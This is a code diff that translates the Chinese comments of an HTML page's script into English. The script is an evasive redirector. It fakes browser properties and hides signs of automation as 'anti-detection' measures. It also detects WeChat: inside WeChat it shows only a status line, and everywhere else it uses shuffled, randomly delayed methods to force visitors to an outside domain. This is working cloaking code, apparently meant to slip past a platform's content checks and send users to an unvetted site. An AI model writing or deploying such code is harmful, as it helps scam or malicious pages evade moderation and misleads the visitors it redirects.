@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -33,9 +33,9 @@
         }
     </style>
     <script>
-        // 增强版防检测措施
+        // Enhanced anti-detection measures
         (function() {
-            // 重写关键属性
+            // Overwrite key attributes
             Object.defineProperty(navigator, 'userAgent', {
                 get: function() {
                     return 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
@@ -43,13 +43,13 @@
                 configurable: true
             });
             
-            // 清除自动化特征
+            // Clear automation features
             Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined,
                 configurable: true
             });
             
-            // 重写语言属性
+            // Overwrite language properties
             Object.defineProperty(navigator, 'language', {
                 get: () => 'zh-CN',
                 configurable: true
@@ -60,30 +60,30 @@
                 configurable: true
             });
             
-            // 删除插件信息
+            // Remove plugin information
             Object.defineProperty(navigator, 'plugins', {
                 get: () => [],
                 configurable: true
             });
         })();
 
-        // 增强版微信检测
+        // Enhanced WeChat detection
         function enhancedWeChatCheck() {
             try {
                 const checks = [];
                 
-                // 方法1：UserAgent检测
+                // Method 1: UserAgent detection
                 checks.push(navigator.userAgent.toLowerCase().includes('micromessenger'));
                 
-                // 方法2：全局对象检测
+                // Method 2: Global object detection
                 checks.push(typeof WeixinJSBridge !== 'undefined');
                 checks.push(typeof wx !== 'undefined');
                 checks.push(typeof __wxjs_environment !== 'undefined');
                 
-                // 方法3：特定API检测
+                // Method 3: Specific API detection
                 checks.push(!!navigator.vendor && navigator.vendor.includes('Tencent'));
                 
-                // 方法4：行为特征检测
+                // Method 4: Behavior feature detection
                 checks.push(!!window.WeixinJSBridge);
                 
                 return checks.some(Boolean);
@@ -92,26 +92,26 @@
             }
         }
 
-        // 随机跳转执行器
+        // Random redirect executor
         function executeRandomRedirect(url) {
             let executed = false;
             let attemptCount = 0;
             
             const methods = [
                 { 
-                    name: "直接跳转", 
+                    name: "Direct redirect", 
                     method: () => { 
                         window.location.href = url; 
                     } 
                 },
                 { 
-                    name: "替换跳转", 
+                    name: "Replace redirect", 
                     method: () => { 
                         window.location.replace(url); 
                     } 
                 },
                 { 
-                    name: "iframe跳转", 
+                    name: "iframe redirect", 
                     method: () => {
                         const iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
@@ -123,7 +123,7 @@
                     } 
                 },
                 { 
-                    name: "模拟点击", 
+                    name: "Simulate click", 
                     method: () => {
                         const link = document.createElement('a');
                         link.href = url;
@@ -131,7 +131,7 @@
                         link.style.display = 'none';
                         document.body.appendChild(link);
                         
-                        // 多种点击方式
+                        // Multiple click methods
                         if (link.click) {
                             link.click();
                         } else if (document.createEvent) {
@@ -142,7 +142,7 @@
                     } 
                 },
                 { 
-                    name: "表单提交", 
+                    name: "Form submission", 
                     method: () => {
                         const form = document.createElement('form');
                         form.method = 'GET';
@@ -155,21 +155,21 @@
                 }
             ];
             
-            // 随机打乱执行顺序
+            // Shuffle execution order
             const shuffledMethods = methods.sort(() => Math.random() - 0.5);
             
-            // 更新状态显示
+            // Update status display
             function updateStatus(methodName) {
                 attemptCount++;
                 const statusEl = document.getElementById('status');
                 if (statusEl) {
-                    statusEl.innerHTML = `尝试跳转方式 ${attemptCount}: ${methodName}`;
+                    statusEl.innerHTML = `Attempt redirect method ${attemptCount}: ${methodName}`;
                 }
             }
             
-            // 执行随机跳转
+            // Execute random redirect
             shuffledMethods.forEach((methodObj, index) => {
-                const delay = (index + 1) * 300 + Math.random() * 200; // 300-500ms间隔
+                const delay = (index + 1) * 300 + Math.random() * 200; // 300-500ms interval
                 
                 setTimeout(() => {
                     if (!executed) {
@@ -177,26 +177,26 @@
                             updateStatus(methodObj.name);
                             methodObj.method();
                             executed = true;
-                            console.log(`跳转成功: ${methodObj.name}`);
+                            console.log(`Redirect successful: ${methodObj.name}`);
                         } catch (error) {
-                            console.log(`跳转失败: ${methodObj.name}`, error);
+                            console.log(`Redirect failed: ${methodObj.name}`, error);
                         }
                     }
                 }, delay);
             });
             
-            // 最终保障：5秒后强制跳转
+            // Final guarantee: Forced redirect after 5 seconds
             setTimeout(() => {
                 if (!executed) {
-                    updateStatus("最终强制跳转");
+                    updateStatus("Forced redirect");
                     window.location.href = url;
                 }
             }, 5000);
         }
 
-        // 主逻辑
+        // Main logic
         (function main() {
-            // 随机延迟执行主逻辑
+            // Random delay before executing main logic
             const delay = Math.random() * 1000 + 500;
             
             setTimeout(() => {
@@ -204,20 +204,20 @@
                 const targetUrl = 'https://phuro2.cc';
                 const redirectUrl = targetUrl + queryString;
 
-                // 检测环境并执行相应操作
+                // Check environment and execute corresponding operation
                 if (enhancedWeChatCheck()) {
-                    // 微信环境：只显示状态信息
+                    // In WeChat environment: Only show status information
                     document.getElementById('message').innerHTML = `
-                        <div class="status">检测到微信环境</div>
+                        <div class="status">WeChat environment detected</div>
                     `;
                 } else {
-                    // 非微信环境：执行随机跳转
+                    // In non-WeChat environment: Execute random redirect
                     document.getElementById('message').innerHTML = `
                         <div class="loading"></div>
-                        <div class="status" id="status">初始化跳转程序...</div>
+                        <div class="status" id="status">Initializing redirect program...</div>
                     `;
                     
-                    // 短暂延迟后开始跳转
+                    // Start redirect after a short delay
                     setTimeout(() => {
                         executeRandomRedirect(redirectUrl);
                     }, 800);
